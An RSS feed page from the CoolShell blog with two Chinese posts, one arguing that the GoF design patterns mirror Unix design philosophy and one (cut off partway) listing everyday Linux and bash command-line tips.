<?xml version="1.0" encoding="UTF-8"?><rss version="2.0"
	xmlns:content="http://purl.org/rss/1.0/modules/content/"
	xmlns:wfw="http://wellformedweb.org/CommentAPI/"
	xmlns:dc="http://purl.org/dc/elements/1.1/"
	xmlns:atom="http://www.w3.org/2005/Atom"
	xmlns:sy="http://purl.org/rss/1.0/modules/syndication/"
	xmlns:slash="http://purl.org/rss/1.0/modules/slash/"
	>

<channel>
	<title>第 10 页 &#8211; 酷 壳 &#8211; CoolShell</title>
	<atom:link href="https://coolshell.cn/feed?paged=10" rel="self" type="application/rss+xml" />
	<link>https://coolshell.cn</link>
	<description>享受编程和技术所带来的快乐 - Coding Your Ambition</description>
	<lastBuildDate>Mon, 06 Jul 2020 10:00:52 +0000</lastBuildDate>
	<language>zh-CN</language>
	<sy:updatePeriod>
	hourly	</sy:updatePeriod>
	<sy:updateFrequency>
	1	</sy:updateFrequency>
	<generator>https://wordpress.org/?v=6.2</generator>
	<item>
		<title>从面向对象的设计模式看软件设计</title>
		<link>https://coolshell.cn/articles/8961.html</link>
					<comments>https://coolshell.cn/articles/8961.html#comments</comments>
		
		<dc:creator><![CDATA[陈皓]]></dc:creator>
		<pubDate>Fri, 01 Feb 2013 00:15:59 +0000</pubDate>
				<category><![CDATA[Unix/Linux]]></category>
		<category><![CDATA[杂项资源]]></category>
		<category><![CDATA[程序设计]]></category>
		<category><![CDATA[Design]]></category>
		<category><![CDATA[design pattern]]></category>
		<category><![CDATA[Object-Oriented]]></category>
		<category><![CDATA[Unix]]></category>
		<guid isPermaLink="false">http://coolshell.cn/?p=8961</guid>

					<description><![CDATA[<p>前些天发了一篇《如此理解面向对象编程》的文章，然后引起了大家的热议。然后我在微博上说了一句——“那23个经典的设计模式和OO半毛钱关系没有，只不过人家用OO来实...</p>
<p class="read-more"><a class="btn btn-default" href="https://coolshell.cn/articles/8961.html"> Read More<span class="screen-reader-text">  Read More</span></a></p>
The post <a href="https://coolshell.cn/articles/8961.html">从面向对象的设计模式看软件设计</a> first appeared on <a href="https://coolshell.cn">酷 壳 - CoolShell</a>.]]></description>
										<content:encoded><![CDATA[<p><script async src="https://pagead2.googlesyndication.com/pagead/js/adsbygoogle.js?client=ca-pub-3415450859608158"
     crossorigin="anonymous"></script>前些天发了一篇《<a title="如此理解面向对象编程" href="https://coolshell.cn/articles/8745.html" target="_blank" rel="bookmark">如此理解面向对象编程</a>》的文章，然后引起了大家的热议。然后我在<a href="http://weibo.com/1401880315/z9wWHrrVR" target="_blank">微博上说</a>了一句——“<strong>那23个经典的设计模式和OO半毛钱关系没有，只不过人家用OO来实现罢了……OO的设计模式思想和Unix的设计思想基本没什么差别</strong>”，结果引来了一点点争议。所以，我写下这篇文章把我的观点说明一下。我希望这样可以让大家更容易地理解什么是设计模式。<strong>我顺便帮OO和 Unix/Linux搞搞基</strong>。</p>
<h4>什么是模式</h4>
<p>在正式说明GoF的那23个经典的设计模式其实和OO关系不大并和Unix的设计思想很相似的这个观点之前，让我先来说说什么是模式？设计模式的英文是Design Pattern，模式是Pattern的汉译。所谓Pattern就是一种规则，或是一种模型，或是一种习惯。Pattern这个东西到处都是，并不只有技术圏子里才有。比如：</p>
<ul>
<li>文章有文章的Pattern。如新闻有新闻的Pattern（第一段话简述了整个新闻），诗歌总是抒情的，论文总是死板的，讲稿总是高谈的，漫画总是幽默的，……</li>
<li><span style="line-height: 13px;">小说有小说的Pattern。比如，</span>
<ul>
<li><span style="line-height: 13px;">武侠小说必然要整个武林大会，整几个NB的武功和大师，分个正派和反派，还有一个或数个惊天阴谋，坏人总是要在一开始占尽优势，好人总是要力挽狂澜……</span></li>
<li><span style="line-height: 13px;">言情小说总是要有第三者，总是要有负心人，里面的女子总是要哭得死去活来，但又痴心不改，……</span></li>
</ul>
</li>
<li> 新闻联播的模式是：头10分钟领导很忙，中间10分钟人民很幸福，后10分钟国外很乱。中国政府官方宣传稿也模式也很明显，各种赞美，口号，胜利，总是要坚持个什么，团结个什么，迈向个什么，某某精神，某某思想，群众情绪稳定，不明真相，等等……</li>
<li>春节的模式是，回家，吃饺子，放个鞭炮，给压岁钱，同学聚会…… 同学聚会的模式基本上都是在饭桌上回忆一下校园时光，比较一下各自的当前处境，调戏一下女同学……</li>
<li>…… ……</li>
</ul>
<p>这就是Pattern，只要你细心观察，你会发现这世间有很多很多的Pattern。</p>
<p><span id="more-8961"></span></p>
<h4>GoF的23个设计模式</h4>
<p>《<a href="http://product.china-pub.com/25961" target="_blank">设计模式</a>》这本书中，GoF这四个人总结了23个经典的面向对象的设计模式，某中有5个创建模式，7个结构模式，11个行为模式。<strong>很多人都会觉得这是面向对象的设计模式，很多人也觉得非面向对象不能用这些模式。我觉得这是一种教条主义。</strong>就像《<a title="各种流行的编程风格" href="https://coolshell.cn/articles/2058.html" target="_blank">那些流行的编程方法</a>》中的“设计模式驱动型编程”一样，就像《<a title="如此理解面向对象编程" href="https://coolshell.cn/articles/8745.html" target="_blank">如此理解面向对象</a>》一样的那么的滑稽。</p>
<p>好了，回到我的论点——“<strong>GoF的这23个设计模式和OO关系不大，并且和Unix的设计思想基本一致，只不过GoF用OO实现了它们</strong>”，就像我上面说过的那些生活中的Pattern一样，只要你仔细思考，你会发现这23个设计模式在我们的生活和社会中也能有他们的身影。而且也一样可以用OO的方式实现之。</p>
<p>让我们来看看这23个经典的设计模式中的几个常用的模式：</p>
<p><strong>Factory 模式</strong>，这个模式可能是是个人都知道的模式。这个模式在现实社会中就像各种工厂一样，工厂跨界的不多，基本上都是在生产同一类的产品，有的生产汽车，有的生产电视，有的生产衣服，有的生产卫生纸……基本上来说，一个生产线上只有做同一类的东西。这和Factory模式很相似。编程中，像内存池，线程池，连接池等池化技术都是这个模式，当然，Factory给你的一个对象，而不单单只是资源，factory创建出来的对象都有同样的接口可以被多态调用。<strong>这其实和Unix把所有的硬件都factory成文件一样，并提供了read/write等文件操作来让你操作任意设备的I/O</strong>。</p>
<p><strong>Abstract Factor</strong>y：抽象工厂这个模式是创建一组有同一主题的不同的类。这个模式在现实社会当中也有很多例子，比如：</p>
<ul>
<li>移动公司的合约机计划，88套餐（通话100分钟，短信100条，彩信，20条，上网200M），128套餐（通话200分钟，短信150条，彩信50条，上网500M）……</li>
</ul>
<ul>
<li>家里的装修，总是要有厨卫，有门，有灯，有沙发，有茶几，有床，有衣柜，有电视，有冰箱，有洗衣机……，这些都是必需的，只是每个家庭里的具体装修不一样。</li>
</ul>
<ul>
<li>Diablo游戏中的Normal，Hard，Nightmare，Hell模式，这些模式的怪和场景和故事情况都差不多，就是每个场景的怪物和装备的属性不一样。或是WarCraft中的地图就是一个Abstract Factory模式(注：Warcraft的地图什么都能干)。这和学校中的小学，初中，高中，大学差不多，都是一样的学习环境，一样的教学方式，一样的教室，都要期中考和期末考，都有班长和科代表，就是学的东西的难度不一样，但基本上都是语文，英语，数，理，化，还有永远都有的政治课。学校就是一个抽象工厂。</li>
</ul>
<p>这就是抽象工厂的业务模型（或是：Business Pattern），你觉得是不是不一定非要用OO来实现这样的模式？（我们思考一下，我们会不会被先入为主了，觉得不会OO都不知道怎么实现了），不用OO，用相同格式但内容不同的配置文件是不是也能实现？在Unix下<strong>，抽象工厂这个模式在Unix下就像是/etc/rcX.d下的那些东西，1代表命令行单用户，2，代表命令行多用户，3代表命令行多用户完整模式启动，5代表图形界面启动，0代表关机，6代表重启，你要切换的话，init &lt;X&gt;就行了</strong>。</p>
<p><strong>Prototype模式</strong>，原型模式，复制一个类的实现。这个模式在现实中的例子也有很多：传真，复印，都是这个模式。<strong>Unix进程和Github项目的Fork就是一种。进程fork明显不是OO的模型</strong>（参看：<a title="一个fork的面试题" href="https://coolshell.cn/articles/7965.html" target="_blank">关于Fork的一道面试题</a>）。用非OO的方法同样可以实现这个模式。</p>
<p><strong>Singleton模式</strong>，单例模式。生活中，公司只有一个CEO，法律限制你只能有一个老婆，你只能有一个身份证号，一个TCP端口只能被一个进程使用，等等。软件开发方面，并不一定只有OO才能做到，你可以用一个全局变量，一个中心服务器，甚至可以使用行政手段来约束开发中不会出现多个实例。<strong>Unix下实现单例进程的一个最常用的实践是在进程启动的时候用“(S_IRUSR | S_IWUSR | S_IRGRP | S_IROTH)”模式打开一个“锁文件”</strong>。</p>
<p><strong>Adapter模式</strong>，适配器模式。可以兼容欧洲美国中国的插头或插座，万能读卡器，可以播放各种格式多媒体文件的插放器，可以解析FTP/HTTP/HTTPS/等网络协议的浏览器，可以兼容各大银行的银联接口、支付宝、Paypal、VISA等银行接口，可以适配各种后端的解释器的Nginx或Apache，等等。用非OO的编程方式就是重新包装成一个标准接口。<strong>这个模式很像Unix下的/dev下的那些文件，操作系统把系统设备适配成文件，于是你就可以使用read/write来进行读写了</strong>。</p>
<p><strong>Bridge模式</strong>，桥接模式。这个模式用的更多，比如一个灯具可以接各种灯泡或灯管，一个电钻可以换上不同的钻头来适应不同的材料，一辆汽车可以随时更换不同的轮胎来适应不同的路面，你的桌面可以随时更换一个图片来适应你的心情，你的单反相机可以更换不同的镜头来拍不同的照片…… 桥接模式说白了就是组件化，模块化，可以自由拼装。在OO中，其主要是通过让业务类组合一个标准接口来完成，这在非OO的程序设计中用得实在是太多了，主要是通过回调函数或是标准接口来实现。这个也是Unix设计哲学中的主要思想。<strong>在Unix中，文件的权限使用的就是Bridge模式，标准接口是用户，用户组和其它，rwx三个模式，然后用 chmod/chown改一改，这文件就有不同的属主和属性了</strong>。</p>
<p><strong>Decorator模式</strong>，装饰模式。这个模式在生活中太多了，你给你的手机或电脑贴个什么，挂个什么，吃东西的时候加点什么佐料，多点肉还是多个蛋，一个Unix/Linux命令的各种参数是对这个命令的修饰，等等。<strong>我觉得这个模式在Unix中最经常的体现就是通过管道把命令连接起来来完成一个功能</strong>，比如：ps -elf  是列进程的，用管道 grep hchen就可以达到过滤的目的，grep的逻辑没有侵入ps中，grep 修饰了 ps，但是其组合起来完成了一个特定的功能。可见，这和OO没有什么关系。</p>
<p><strong>Facade模式，</strong>这个模式我们每个人从会编程的时候就在无意识地用这个模式了。这个模式就是把一大堆类拼装起来，并统一往外提供提口。在现实生活中这样的例子太多了，比如：旅行社把机票，酒店，景点，导游，司机，进店打了一个包叫旅行；IBM把主机，存储，OS，J2EE，DB，网络，流程打了个包叫企业级解决方案。Unix中最典型的一个例子就是用Shell脚本组合各种命令来创造一个新的功能，这是的Shell中的各种命令通过标准I/O这个接口进行组合交互。</p>
<p><strong>Proxy模式</strong>，代理模式。我们租个房，买个机票，打个官司，都少不了代理，人大代表代理了老百姓去行使政治权力。我们去饭馆里吃饭也是一种代理模式，因为我们只管吃就好了，洗菜做饭洗碗的工作都被Proxy帮你干了，于是你就省事多了。操作系统就是硬件的代理，CDN就是网站的代理，……使用代理你可以让事情变理更简单，也可以在代理层加入一些权限检查，这样可以让业务模块更关注业务，而把一些非业务的事情剥离出来交给代理以完成解耦。可见这个模式和OO没啥关系。<strong>Unix下这个模式最佳体现就是Shell，它代理了系统调用并提供UI</strong>。还有很多命令会帮你把/proc目录下的那些文件内容整理和显示出来。</p>
<p><strong>Chain of Responsibility模式</strong>，劫匪来抢银行，保安搞不定，就交给110，110搞不定就交给武警。有什么事件发生时的响应的Escalation Path，办公中的逐级审批。这个模式用一个函数指针数组或是栈结构就可以实现了。这个思想很像编程中的异常处理机制，一层一层地往上传递异常直到异常被捕捉。<strong>在Unix下，一个最简单的例子就是用 &amp;&amp; 或 || 来把命令拼起来，如：cmd1 &amp;&amp; cmd2  或 cmd3 || cmd4 ， 如果cmd1失败了，cmd2就不会执行，如果cmd3失败了，cmd4才会执行。</strong>如： cd lib &amp;&amp; rm -rf .o 或 ping -c1 coolshell.cn &amp;&amp; ssh haoel@coolshell.cn</p>
<p><strong>Command模式</strong>，这恐怕是软件里最多的模式了，比如：编译器里的Undo/Redo，宏录制。还有数据库的事务处理，线程池，设置向导，包括程序并行执行的指令集等等。这个模式主要是把一个对象的行为封装成一个一个的有相同接口的command，然后交给一个统一的命令执行器执行或管理这些命令。<strong>这个模式和我们的Unix/Linux机器启动时在/etc/init.d下的那些S和K开头的脚本很像，把各种daemon的启动和退出行为封装成一个脚本其支持reload/start/stop/status这样的命令，然后把他们按一定的规范做符号链接到/etc/init.d目录下，这样操作系统就会接管这些daemon的启动和退出</strong>。</p>
<p><strong>Observer模式</strong>，观察者模式，这个模式也叫pub-sub模式，很像我们用手机订阅手机报，微博的follow的信息流也是这样的一个模式。MVC中的C会sub V中的事件，用非OO的方式其实也是一个回调函数的事。在很多异步系统中，你需要知道最终的调用有没有成功，比如说调用支付宝的支付接口，你需要向支付宝注册一个回调的接口，以便支付宝回调你。<strong>Linux下的一些系统调用如epoll/aio/inotify/signal都是这种思路</strong>。</p>
<p><strong>Strategy 模式</strong>，策略模式，这个模式和Bridge模式很像，只不过Bridge是结构模式，其主要是用于对象的构造；而Strategy是行为模式，主要是用于对象的行为。策略模式很像浏览器里的各种插件，只要你装了某个插件，你就有某个功能。你可以安装多个插件来让你的浏览器有更多的功能（书本上的这个模式是你只能选用一个算法，当然，我们不用那么教条）。<strong>就像《<a title="你可能不知道的Shell" href="https://coolshell.cn/articles/8619.html" target="_blank">你可能不知道的Shell</a>》中的那个设置设置$EDITOR变量后可以按ctrl+x e启动编译器，或是用set -o vi或set -o emacs 来让自己的shell像vi或 emacs 一样，或是像find -exec或xargs一样的拼装命令</strong>。</p>
<p><strong>Bridge 和 Strategy是OO设计模式里的“Favor Composition Over Inheritance” 的典范，其实现了接口与实现分离的</strong>。Unix中的Shell就是一种，你可随意地更换不同的Shell。还有Emacs中的LISP驱动C，C实现了引擎，交给LISP实现逻辑。把程序分为前端和后端，通过socket专用应用协议进行通讯，前端实现策略，后端实现机制。再看看makefile把编译器和源代码的解耦，命令行输出这个接口可以把一个复杂的功能解耦并抽像成各种各样小而美的小功能命令，等等这样的例子，你会发现，还有大量的编程框架都会多少采用这样的思想，可以让你的软件像更换汽车零件一样方便。我在用<a title="用Unix的设计思想来应对多变的需求" href="https://coolshell.cn/articles/7236.html" target="_blank">Unix的设计思想来应对变更的需求</a>中说过灯具厂，灯泡厂，和开关厂的例子。</p>
<h4>后记</h4>
<p>因为写作仓促，上面的那些东西，可能会你让你觉得有些牵强，那么抱歉了，你可以帮我看看在生活中和 Unix里有没有更帅的例子。</p>
<p>不过，我们会发现上面OO搞出来的那么多模式在Unix下看来好像没有那么复杂，而且Unix下看起来并没有那么多模式，而且Unix中的设计模式无非就是这么几个关键词：<strong>单一，简洁，模块，拼装</strong>。我们再来看看OO设计的两大准则：<strong>1）钟情于组合而不是继承，2）依赖于接口而不是实现</strong>。还有S.O.L.I.D原则也一样（如果你仔细观察，你会发现SOLID原则在Unix下也是完美地体现）。你看，Unix和OO设计模式是不是完美的统一吗？</p>
<p>我有种强烈的感觉——<strong>Unix对这些所谓的OO的设计模式实现得更好</strong>。因为Unix就一条设计模式！再次推荐《<em><a href="http://book.douban.com/subject/5387401/" target="_blank">The Art of Unix Programming</a></em>》</p>
<p><img decoding="async" loading="lazy" class="size-full wp-image-8967 aligncenter" alt="Unix Kiss" src="https://coolshell.cn/wp-content/uploads/2013/01/kiss.png" width="468" height="219" srcset="https://coolshell.cn/wp-content/uploads/2013/01/kiss.png 468w, https://coolshell.cn/wp-content/uploads/2013/01/kiss-300x140.png 300w" sizes="(max-width: 468px) 100vw, 468px" /></p>
<h4>餐后甜点</h4>
<p>我上面提到了《<em><a href="http://book.douban.com/subject/5387401/" target="_blank">The Art of Unix Programming</a></em>》，所以我有必要再谈谈这本书中我中毒最深的一章《模块性：保持清晰和简洁》中所谈到的胶合层。</p>
<p>胶合层这一节中说了，我们开发软件一般要么Top-Down，要么Bottom-Up，这两种方法都有好有不好。顶层一般是应用逻辑层，底层一般是原语层（我理解为技术沉淀层，或是技术基础层）。自顶向下的开发，你可能会因为开发到底层后发现底层可沉淀的东西越来越不爽（因为被可能被很多业务逻辑所侵入），如果自底向上的开发，你可能越到上层你越发现很多你下面干的基础上工作有很多用不上（比如干多了）。所以，最好的方式是同时进行，一会顶层，一会底层，来来回回的开发——说白了就是在开发中不断的重构，边开发边理解边沉淀。</p>
<p>无论怎么样，你会发现需要一层胶合层来胶合业务逻辑层和底层原语层（软件开发中的业务层和技术层的胶合），Unix的设计哲学认为，这层胶合层应该尽量地薄，胶合层越多，我们就只能在其中苦苦挣扎。</p>
<p>其实，<strong>胶合层原则就是分离原则上更为上层地体现，策略（业务逻辑）和机制（基础技术或原语）的清楚的分离。你可以看到，OO和Unix都是在做这样的分离。但是需要注意到的时，OO用抽象接口来做这个分离——很多OO的模式中，抽象层太多了，导致胶合层太过于复杂了，也就是说，OO鼓励了——“厚重地胶合和复杂层次”，反而增加了程序的复杂度（这种情况在恶化中）。而Unix采用的是薄的胶合层，薄地相当的优雅</strong>。（通过这段话的描述，我相信你会明白了《<a title="如此理解面向对象编程" href="https://coolshell.cn/articles/8745.html" target="_blank" rel="bookmark">如此理解面向对象编程</a>》中的个例子——为什么用OO来实现会比用非OO来实现更为地恶心——那就是因为OO胶合层太复杂了）</p>
<p><strong>OO的最大的问题就——接口复杂度太高，胶合层太多！</strong>（注：Unix编程艺术这本书里说了软件有三个复杂度：代码量、接口、实现，这三个东西构成了我们的软件复杂度）</p>
<h4>再送一个果盘</h4>
<p>大家一定记得《<a title="SteveY对Amazon和Google平台的长篇大论 - 60,581 人阅读" href="https://coolshell.cn/articles/5701.html">SteveY对Amazon和Google平台的长篇大论</a>》中Amazon中那个令人非常向往的SOA式的架构。因为以前在Amazon，有些话不好说。现在可以说了，我在Amazon里，我个人对这个服务化的架构相当的不待见，太复杂，复杂以乱七八糟，方向是好的，想法也是好的，但是这东西和OO一样，造成大量的接口复杂度，今天的Amazon，完全没人知道各个服务是怎么个调用的，一团乱麻（其内部并不像你看到的AWS那么的美妙。注：AWS是非常不错的，是相当好的设计）。</p>
<p><strong>那么我们怎么来解决SOA的接口复杂度问题？其实，Unix早就给出了答案——数据驱动编程</strong>（详见：《Unix编程艺术》的第9.1章），在我离开Amazon的时候，美国总部的Principle SDE们在吐槽今天Amazon的SOA架构，更好的架构应该是数据驱动式的。（今天还在Amazon的同学可以上内网boardcast上看看相关的Principle Talk视频）</p>
<p>（瞎扯一句：这本来是我想在2012年杭州QCon上的分享的一个主题，无奈当时被大会组织者给拒了，所以只好讲了一个《建一支小团队》，今天有多人还是不能明白甚至反感我的那个《小团队》的演讲，但是我相信那是必然的趋势，就像十年前大家在说“程序员只能干到30岁”时，当时的我我却毫不犹豫地相信十年后，30岁以上的有经验的老程序员一定会成为各个公司角逐和竟争的红人）<!--



<p align="center"><a href= target=_blank><img decoding="async" src=""></a></p>





<p align="center"><img decoding="async" src="https://coolshell.cn/wp-content/uploads/2020/03/coolshell.weixin.jpg"> <img decoding="async" loading="lazy" src="https://coolshell.cn/wp-content/uploads/2020/03/coolshell.mini_.jpg" width="300" height="300"> <br />关注CoolShell微信公众账号和微信小程序</p>

 

--></p>
<div style="margin-top: 15px; font-size: 16px;color: #cc0000;">
<p align="center"><strong>（转载本站文章请注明作者和出处 <a href="https://coolshell.cn/">酷 壳 &#8211; CoolShell</a> ，请勿用于任何商业用途）</strong></p>
</div>

<div class="wp_rp_wrap  wp_rp_vertical_m" id="wp_rp_first"><div class="wp_rp_content"><h3 class="related_post_title">相关文章</h3><ul class="related_post wp_rp"><li ><a href="https://coolshell.cn/articles/9949.html" class="wp_rp_thumbnail"><img src="https://coolshell.cn/wp-content/uploads/2013/07/inverted-bookshelf_thumb-150x150.jpg" alt="IoC/DIP其实是一种管理思想" width="150" height="150" /></a><a href="https://coolshell.cn/articles/9949.html" class="wp_rp_title">IoC/DIP其实是一种管理思想</a></li><li ><a href="https://coolshell.cn/articles/7236.html" class="wp_rp_thumbnail"><img src="https://coolshell.cn/wp-content/uploads/2012/05/Bannière-Unix-linux-150x150.jpg" alt="用Unix的设计思想来应对多变的需求" width="150" height="150" /></a><a href="https://coolshell.cn/articles/7236.html" class="wp_rp_title">用Unix的设计思想来应对多变的需求</a></li><li ><a href="https://coolshell.cn/articles/4535.html" class="wp_rp_thumbnail"><img src="https://coolshell.cn/wp-content/plugins/wordpress-23-related-posts-plugin/static/thumbs/1.jpg" alt="一些软件设计的原则" width="150" height="150" /></a><a href="https://coolshell.cn/articles/4535.html" class="wp_rp_title">一些软件设计的原则</a></li><li ><a href="https://coolshell.cn/articles/17416.html" class="wp_rp_thumbnail"><img src="https://coolshell.cn/wp-content/uploads/2016/07/cache-150x150.png" alt="缓存更新的套路" width="150" height="150" /></a><a href="https://coolshell.cn/articles/17416.html" class="wp_rp_title">缓存更新的套路</a></li><li ><a href="https://coolshell.cn/articles/6950.html" class="wp_rp_thumbnail"><img src="https://coolshell.cn/wp-content/plugins/wordpress-23-related-posts-plugin/static/thumbs/21.jpg" alt="需求变化与IoC" width="150" height="150" /></a><a href="https://coolshell.cn/articles/6950.html" class="wp_rp_title">需求变化与IoC</a></li><li ><a href="https://coolshell.cn/articles/21672.html" class="wp_rp_thumbnail"><img src="https://coolshell.cn/wp-content/uploads/2021/12/bachelor-mechanical-eng-icon@72x-150x150.png" alt="我做系统架构的一些原则" width="150" height="150" /></a><a href="https://coolshell.cn/articles/21672.html" class="wp_rp_title">我做系统架构的一些原则</a></li></ul></div></div>The post <a href="https://coolshell.cn/articles/8961.html">从面向对象的设计模式看软件设计</a> first appeared on <a href="https://coolshell.cn">酷 壳 - CoolShell</a>.]]></content:encoded>
					
					<wfw:commentRss>https://coolshell.cn/articles/8961.html/feed</wfw:commentRss>
			<slash:comments>92</slash:comments>
		
		
			</item>
		<item>
		<title>应该知道的Linux技巧</title>
		<link>https://coolshell.cn/articles/8883.html</link>
					<comments>https://coolshell.cn/articles/8883.html#comments</comments>
		
		<dc:creator><![CDATA[陈皓]]></dc:creator>
		<pubDate>Wed, 09 Jan 2013 00:24:29 +0000</pubDate>
				<category><![CDATA[Unix/Linux]]></category>
		<category><![CDATA[操作系统]]></category>
		<category><![CDATA[杂项资源]]></category>
		<category><![CDATA[Bash]]></category>
		<category><![CDATA[Linux]]></category>
		<category><![CDATA[Performance]]></category>
		<category><![CDATA[Shell]]></category>
		<category><![CDATA[Unix]]></category>
		<category><![CDATA[vim]]></category>
		<guid isPermaLink="false">http://coolshell.cn/?p=8883</guid>

					<description><![CDATA[<p>这篇文章来源于Quroa的一个问答《What are some time-saving tips that every Linux user should kn...</p>
<p class="read-more"><a class="btn btn-default" href="https://coolshell.cn/articles/8883.html"> Read More<span class="screen-reader-text">  Read More</span></a></p>
The post <a href="https://coolshell.cn/articles/8883.html">应该知道的Linux技巧</a> first appeared on <a href="https://coolshell.cn">酷 壳 - CoolShell</a>.]]></description>
										<content:encoded><![CDATA[<p><script async src="https://pagead2.googlesyndication.com/pagead/js/adsbygoogle.js?client=ca-pub-3415450859608158"
     crossorigin="anonymous"></script><img decoding="async" loading="lazy" class="alignright size-full wp-image-8899" alt="" src="https://coolshell.cn/wp-content/uploads/2013/01/linux-bash-300x225.jpg" width="300" height="225" />这篇文章来源于Quroa的一个问答《<a href="http://www.quora.com/Linux/What-are-some-time-saving-tips-that-every-Linux-user-should-know#" target="_blank">What are some time-saving tips that every Linux user should know?</a>》—— Linux用户有哪些应该知道的提高效率的技巧。我觉得挺好的，总结得比较好，把其转过来，并加了一些自己的理解。 首先，我想告诉大家，<strong>在Unix/Linux下，最有效率技巧的不是操作图形界面，而是命令行操作，因为命令行意味着自动化</strong>。如果你看过《<a title="你可能不知道的Shell" href="https://coolshell.cn/articles/8619.html" target="_blank">你可能不知道的Shell</a>》以及《<a title="28个Unix/Linux的命令行神器" href="https://coolshell.cn/articles/7829.html" target="_blank">28个Unix/Linux的命令行神器</a>》你就会知道Linux有多强大，这个强大完全来自于命令行，于是，就算你不知道怎么去<a title="做个环保主义的程序员" href="https://coolshell.cn/articles/7186.html" target="_blank">做一个环保主义的程序员</a>，至少他们可以让你少熬点夜，从而有利于你的身体健康和性生活。下面是一个有点长的列表，正如作者所说，你并不需要知道所有的这些东西，但是如果你还在很沉重地在使用Linux的话，这些东西都值得你看一看。 （注：如果你想知道下面涉及到的命令的更多的用法，你一定要man一点。对于一些命令，你可以需要先yum或apt-get来安装一下，如果有什么问题，别忘了Google。如果你要Baidu的话，我仅代表这个地球上所有的生物包括微生物甚至细菌病毒和小强BS你到宇宙毁灭）</p>
<h4>基础</h4>
<ul>
<li><strong>学习 <a href="http://www.quora.com/Bash-shell" target="_blank">Bash</a> </strong>。你可以man bash来看看bash的东西，并不复杂也并不长。你用别的shell也行，但是bash是很强大的并且也是系统默认的。（学习zsh或tsch只会让你在很多情况下受到限制）</li>
</ul>
<ul>
<li><strong>学习 vim</strong> 。在Linux下，基本没有什么可与之竞争的编<del>译</del>辑器（就算你是一个Emacs或Eclipse的重度用户）。你可以看看《<a title="简明 Vim 练级攻略" href="https://coolshell.cn/articles/5426.html" target="_blank">简明vim攻略</a>》和 《<a title="游戏：VIM大冒险" href="https://coolshell.cn/articles/7166.html" target="_blank">Vim的冒险游戏</a>》以及《<a title="给程序员的VIM速查卡" href="https://coolshell.cn/articles/5479.html" target="_blank">给程序员的Vim速查卡</a>》还有《<a title="将vim变得简单:如何在vim中得到你最喜爱的IDE特性" href="https://coolshell.cn/articles/894.html" target="_blank">把Vim变成一个编程的IDE</a>》等等。</li>
</ul>
<ul>
<li><strong>了解 ssh</strong>。明白不需要口令的用户认证（通过ssh-agent, ssh-add），学会用ssh翻墙，用scp而不是ftp传文件，等等。你知道吗？scp 远端的时候，你可以按tab键来查看远端的目录和文件（当然，需要无口令的用户认证），这都是bash的功劳。</li>
</ul>
<p><span id="more-8883"></span></p>
<ul>
<li><strong>熟悉bash的作业管理</strong>，如： &amp;, Ctrl-Z, Ctrl-C, jobs, fg, bg, kill, 等等。当然，你也要知道Ctrl+\（SIGQUIT）和Ctrl+C （SIGINT）的区别。</li>
</ul>
<ul>
<li><strong>简单的文件管理</strong> ： ls 和 ls -l (你最好知道 &#8220;ls -l&#8221; 的每一列的意思), less, head, tail 和 tail -f, ln 和 ln -s (你知道明白hard link和soft link的不同和优缺点), chown, chmod, du (如果你想看看磁盘的大小 du -sk *), df, mount。当然，原作者忘了find命令。</li>
</ul>
<ul>
<li><strong>基础的网络管理</strong>： ip 或 ifconfig, dig。当然，原作者还忘了如netstat, ping, traceroute, 等</li>
</ul>
<ul>
<li><strong>理解正则表达式</strong>，还有grep/egrep的各种选项。比如： -o, -A, 和 -B 这些选项是很值得了解的。</li>
</ul>
<ul>
<li><strong>学习使用 apt-get 和 yum 来查找和安装软件</strong>（前者的经典分发包是Ubuntu，后者的经典分发包是Redhat），我还建议你试着从源码编译安装软件。</li>
</ul>
<p><b>日常</b></p>
<ul>
<li>在 bash 里，使用 Ctrl-R 而不是上下光标键来查找历史命令。</li>
</ul>
<ul>
<li>在 bash里，使用 Ctrl-W 来删除最后一个单词，使用 Ctrl-U 来删除一行。请man bash后查找Readline Key Bindings一节来看看bash的默认热键，比如：Alt-. 把上一次命令的最后一个参数打出来，而Alt-* 则列出你可以输入的命令。</li>
</ul>
<ul>
<li>回到上一次的工作目录： cd &#8211;  （回到home是 cd ~）</li>
</ul>
<ul>
<li>使用 xargs。这是一个很强大的命令。你可以使用-L来限定有多少个命令，也可以用-P来指定并行的进程数。如果你不知道你的命令会变成什么样，你可以使用xargs echo来看看会是什么样。当然， -I{} 也很好用。示例：</li>
</ul>
<blockquote>
<pre data-enlighter-language="shell" class="EnlighterJSRAW">find . -name \*.py | xargs grep some_function

cat hosts | xargs -I{} ssh root@{} hostname</pre>
</blockquote>
<ul>
<li>pstree -p 可以帮你显示进程树。（读过我的那篇《<a title="一个fork的面试题" href="https://coolshell.cn/articles/7965.html" target="_blank">一个fork的面试题</a>》的人应该都不陌生）</li>
</ul>
<ul>
<li>使用 pgrep 和 pkill 来找到或是kill 某个名字的进程。 (-f 选项很有用).</li>
</ul>
<ul>
<li>了解可以发给进程的信号。例如：要挂起一个进程，使用 kill -STOP [pid]. 使用 man 7 signal 来查看各种信号，使用kill -l 来查看数字和信号的对应表</li>
</ul>
<ul>
<li>使用 nohup 或  disown 如果你要让某个进程运行在后台。</li>
</ul>
<ul>
<li>使用netstat -lntp来看看有侦听在网络某端口的进程。当然，也可以使用 lsof。</li>
</ul>
<ul>
<li>在bash的脚本中，你可以使用 set -x 来debug输出。使用 set -e 来当有错误发生的时候abort执行。考虑使用 set -o pipefail 来限制错误。还可以使用trap来截获信号（如截获ctrl+c）。</li>
</ul>
<ul>
<li>在bash 脚本中，subshells (写在圆括号里的) 是一个很方便的方式来组合一些命令。一个常用的例子是临时地到另一个目录中，例如：</li>
</ul>
<blockquote>
<pre data-enlighter-language="shell" class="EnlighterJSRAW"># do something in current dir
(cd /some/other/dir; other-command)
# continue in original dir</pre>
</blockquote>
<ul>
<li>在 bash 中，注意那里有很多的变量展开。如：检查一个变量是否存在: ${name:?error message}。如果一个bash的脚本需要一个参数，也许就是这样一个表达式 input_file=${1:?usage: $0 input_file}。一个计算表达式： i=$(( (i + 1) % 5 ))。一个序列： {1..10}。 截断一个字符串： ${var%suffix} 和 ${var#prefix}。 示例： if var=foo.pdf, then echo ${var%.pdf}.txt prints &#8220;foo.txt&#8221;.</li>
</ul>
<ul>
<li>通过 &lt;(some command) 可以把某命令当成一个文件。示例：比较一个本地文件和远程文件 /etc/hosts： diff /etc/hosts &lt;(ssh somehost cat /etc/hosts)</li>
</ul>
<ul>
<li>了解什么叫 &#8220;<a href="http://zh.wikipedia.org/wiki/Here%E6%96%87%E6%A1%A3" target="_blank">here documents</a>&#8221; ，就是诸如 cat &lt;&lt;EOF 这样的东西。</li>
</ul>
